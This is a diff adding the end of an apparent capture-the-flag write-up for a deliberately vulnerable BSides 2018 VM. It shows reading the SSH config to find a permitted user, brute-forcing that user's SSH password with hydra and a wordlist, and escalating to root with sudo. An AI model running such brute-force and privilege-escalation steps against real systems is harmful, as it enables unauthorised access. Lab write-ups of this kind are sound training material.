@@ -539,5 +539,58 @@ meterpreter >
 ```
 Booooooooooom We have our Meterpreter session open :-D 
 
+now when we go to */home* we have found there are 5 users , lets see the ssh config file which is located */etc/sshd_config* 
+```shell
+Match User abatchy,john,mai,doomguy
+	PasswordAuthentication no
 
+``
+now there are bunch of commands and at the end we have the command above which means that the following users are not allowed to login using ssh so we only have **anne**
 
+Brute Forcing the SSH for the user **anne** 
+
+```shell
+root@kali:~/Desktop/SecLists/Passwords# hydra -l anne -P rockyou.txt 192.168.224.3 ssh
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-04-14 10:23:39
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.224.3:22/
+[22][ssh] host: 192.168.224.3   login: anne   password: princess
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 10 final worker threads did not complete until end.
+[ERROR] 10 targets did not resolve or could not be connected
+[ERROR] 16 targets did not complete
+Hydra (http://www.thc.org/thc-hydra) finished at 2018-04-14 10:24:03
+```
+to gain Root access its fairly simple 
+Login with SSH on Anne Account then follow the below commands 
+```shell
+anne@bsides2018:~$ ls
+anne@bsides2018:~$ sudo /bin/bash -p
+root@bsides2018:~# ls
+root@bsides2018:~# cd /root
+root@bsides2018:/root# ls
+flag.txt
+root@bsides2018:/root# cat flag.txt
+Congratulations!
+
+If you can read this, that means you were able to obtain root permissions on this VM.
+You should be proud!
+
+There are multiple ways to gain access remotely, as well as for privilege escalation.
+Did you find them all?
+
+@abatchy17
+```
+
+Another way of doing it is the following 
+
+```shell
+anne@bsides2018:~$ sudo su
+root@bsides2018:/home/anne# cd /root
+root@bsides2018:~# ls
+flag.txt
+```
